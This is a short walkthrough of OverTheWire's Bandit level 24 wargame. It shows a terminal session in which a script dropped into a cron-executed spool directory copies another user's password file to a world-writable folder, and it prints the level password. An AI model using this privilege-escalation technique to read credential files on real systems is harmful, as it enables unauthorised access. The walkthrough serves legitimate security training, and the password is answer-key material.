# Bandit 24

A program is running automatically at regular intervals from cron, the time-based job scheduler. Look in /etc/cron.d/ for the configuration and see what command is being executed.

NOTE: This level requires you to create your own first shell-script. This is a very big step and you should be proud of yourself when you beat this level!

NOTE 2: Keep in mind that your shell script is removed once executed, so you may want to keep a copy around…

**Solution**

*Terminal*
```
bandit23@melinda:~$ cat /etc/cron.d/cronjob_bandit24
* * * * * bandit24 /usr/bin/cronjob_bandit24.sh &> /dev/null
bandit23@melinda:~$ cat /usr/bin/cronjob_bandit24.sh
#!/bin/bash

myname=$(whoami)

cd /var/spool/$myname
echo "Executing and deleting all scripts in /var/spool/$myname:"
for i in * .*;
do
    if [ "$i" != "." -a "$i" != ".." ];
    then
	echo "Handling $i"
	timeout -s 9 60 "./$i"
	rm -f "./$i"
    fi
done

bandit23@melinda:~$ mkdir /tmp/evanyeyeye_bandit24
bandit23@melinda:~$ cd /tmp/evanyeyeye_bandit24
bandit23@melinda:/tmp/evanyeyeye_bandit24$ nano shell.sh
```

*GNU nano editor*
```
#!/bin/bash

cat /etc/bandit_pass/bandit24 > /tmp/evanyeyeye_bandit24/pass.txt
```

*Terminal*
```
bandit23@melinda:/tmp/evanyeyeye_bandit24$ chmod -R 777 ./.
bandit23@melinda:/tmp/evanyeyeye_bandit24$ chmod +x shell.sh
bandit23@melinda:/tmp/evanyeyeye_bandit24$ cp shell.sh /var/spool/bandit24
bandit23@melinda:/tmp/evanyeyeye_bandit24$ echo Wait 60 seconds...
Wait 60 seconds...
bandit23@melinda:/tmp/evanyeyeye_bandit24$ ls
pass.txt  shell.sh
bandit23@melinda:/tmp/evanyeyeye_bandit24$ cat pass.txt
UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ
```

Password is UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ

*All descriptions are borrowed from OverTheWire.*
